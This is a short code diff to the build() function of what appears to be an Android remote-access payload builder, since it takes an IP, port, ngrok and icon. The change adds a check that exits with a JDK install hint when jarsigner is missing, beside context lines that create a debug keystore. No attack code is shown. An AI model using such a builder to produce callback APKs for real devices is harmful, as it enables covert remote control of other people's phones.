@@ -423,6 +423,11 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
             return name
         keytool_bin = _find_tool("keytool")
         jarsigner_bin = _find_tool("jarsigner")
+        if jarsigner_bin == "jarsigner" and shutil.which("jarsigner") is None:
+            print("\r" + stdOutput("error") + "jarsigner not found! You need the Java Development Kit (JDK) to sign APKs.")
+            print(stdOutput("info") + "\033[1mOn Kali/Ubuntu run: \033[32msudo apt install default-jdk\033[0m")
+            sys.exit(1)
+            
         keystore = os.path.join(os.path.dirname(os.path.abspath(__file__)), "jar_utils", "debug.keystore")
         if not os.path.isfile(keystore):
             execute(keytool_bin+' -genkeypair -v -keystore "'+keystore+'" -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Android Debug,O=Android,C=US"')
